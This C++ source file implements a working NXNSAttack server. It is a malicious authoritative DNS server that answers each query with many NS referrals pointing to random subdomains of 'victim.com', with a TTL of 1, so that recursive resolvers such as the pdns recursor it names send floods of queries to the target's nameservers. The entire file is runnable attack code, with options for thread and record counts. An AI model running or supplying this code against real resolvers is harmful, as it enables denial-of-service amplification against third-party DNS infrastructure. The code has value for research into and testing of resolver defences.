#include "dns_server.hpp"
#include "rrgenerator.hpp"
#include "logger.hpp"
#include <sstream>
#include <boost/program_options.hpp>
#include <iostream>
#include <boost/lexical_cast.hpp>
#include <cstdlib>
#include <ctime>

const int   TTL          = 1;
const char *BIND_ADDRESS = "0.0.0.0";

class NXNSAttackServer : public dns::DNSServer
{
public:
    NXNSAttackServer( const dns::DNSServerParameters &param, int count )
        : dns::DNSServer( param ), mNSCount( count )
    {
    }

    dns::MessageInfo generateResponse( const dns::MessageInfo &query, bool via_tcp ) const
    {
        dns::MessageInfo          response;
        dns::QuestionSectionEntry query_question = query.mQuestionSection[ 0 ];

        dns::QuestionSectionEntry question1;
        question1.mDomainname = query_question.mDomainname;
        question1.mType       = query_question.mType;
        question1.mClass      = query_question.mClass;
        response.pushQuestionSection( question1 );

	/*
        if ( ! via_tcp ) {
            response.mID                   = query.mID;
            response.mOpcode               = 0;
            response.mQueryResponse       = 1;
            response.mAuthoritativeAnswer = 1;
            response.mTruncation           = 1;
            response.mRecursionDesired    = 0;
            response.mRecursionAvailable  = 0;
            response.mZeroField           = 0;
            response.mAuthenticData       = 1;
            response.mCheckingDisabled    = 1;
            response.mResponseCode        = dns::NO_ERROR;

            return response;
        }
	*/

	for ( int i = 0 ; i < mNSCount ; i++ ) {
	    dns::ResourceRecord answer;
	    dns::Domainname nsname = "victim.com";
	    std::ostringstream os1;
	    os1 << dns::RandomGenerator::getInstance()->rand();
	    nsname.addSubdomain( os1.str() );
	    answer.mDomainname = query_question.mDomainname;
	    answer.mType       = dns::TYPE_NS;
	    answer.mClass      = dns::CLASS_IN;
	    answer.mTTL        = TTL;
	    answer.mRData =
		dns::RDATAPtr( new dns::RecordNS( nsname ) );
	    response.pushAuthoritySection( answer );
	}
	response.mID                   = query.mID;
	response.mOpcode               = 0;
	response.mQueryResponse       = 1;
	response.mAuthoritativeAnswer = 1;
	response.mTruncation           = 0;
	response.mRecursionDesired    = 0;
	response.mRecursionAvailable  = 0;
	response.mZeroField           = 0;
	response.mAuthenticData       = 1;
	response.mCheckingDisabled    = 1;
	response.mResponseCode        = dns::NO_ERROR;

        return response;
    }

private:
    int mNSCount;
};

int main( int argc, char **argv )
{
    namespace po = boost::program_options;

    std::string bind_address;
    uint16_t    bind_port;
    uint16_t    thread_count;
    uint16_t    ns_count;
    std::string log_level;

    po::options_description desc( "for pdns recursor" );
    desc.add_options()( "help,h", "print this message" )
        ( "bind,b", po::value<std::string>( &bind_address )->default_value( BIND_ADDRESS ), "bind address" )
        ( "port,p", po::value<uint16_t>( &bind_port )->default_value( 53 ), "bind port" )
	( "thread,t", po::value<uint16_t>( &thread_count )->default_value( 16 ), "thread count" )
	( "ns,n", po::value<uint16_t>( &ns_count )->default_value( 16 ), "ns record count" )
	( "log-level,l",
	  po::value<std::string>( &log_level )->default_value( "info" ),
	  "trace|debug|info|warning|error|fatal" )
        ;

    po::variables_map vm;
    po::store( po::parse_command_line( argc, argv, desc ), vm );
    po::notify( vm );

    if ( vm.count( "help" ) ) {
        std::cerr << desc << "\n";
        return 1;
    }

    dns::logger::initialize( log_level );
	
    dns::DNSServerParameters param;
    param.mBindAddress = bind_address;
    param.mBindPort = bind_port;
    param.mThreadCount = thread_count;
    NXNSAttackServer server( param, ns_count );
    server.start();

    return 0;
}
